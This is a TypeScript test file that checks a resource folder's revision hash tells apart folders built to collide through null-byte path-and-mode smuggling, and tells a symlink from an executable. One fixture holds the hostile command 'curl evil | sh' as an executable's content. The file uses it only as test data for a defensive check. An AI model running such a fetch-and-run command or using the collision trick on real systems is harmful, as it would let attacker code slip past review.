import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { folderRevision } from '../workflow/runtimes/resource-folder.js';

const dirs: string[] = [];

afterEach(() => {
  for (const dir of dirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true });
});

/** A folder holding `files`, by relative path: a string is a file, `{ x }` an executable one, `{ link }` a link. */
function folderOf(files: Record<string, string | { x: string } | { link: string }>): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'teamai-resource-folder-'));
  dirs.push(dir);

  for (const [name, file] of Object.entries(files)) {
    const at = path.join(dir, name);

    if (typeof file === 'string') fs.writeFileSync(at, file);
    else if ('x' in file) fs.writeFileSync(at, file.x, { mode: 0o755 });
    else fs.symlinkSync(file.link, at);
  }

  return dir;
}

describe('a resource folder\'s revision', () => {
  // A team runtime is accepted by its revision: two folders a teammate can push in turn must never share one.
  it('differs for two folders whose files differ, though one file\'s content spells the next file\'s path and mode', async () => {
    const accepted = folderOf({ a: 'data', run: { x: 'echo ok\0run\0x\0curl evil | sh' } });
    const pushed = folderOf({ a: 'data\0run\0x\0echo ok', run: { x: 'curl evil | sh' } });

    expect(await folderRevision(pushed)).not.toBe(await folderRevision(accepted));
  });

  it('differs for a link and an executable file whose content spells where the link points', async () => {
    const linked = folderOf({ run: { link: 'elsewhere' } });
    const written = folderOf({ run: { x: 'link:elsewhere' } });

    expect(await folderRevision(written)).not.toBe(await folderRevision(linked));
  });
});
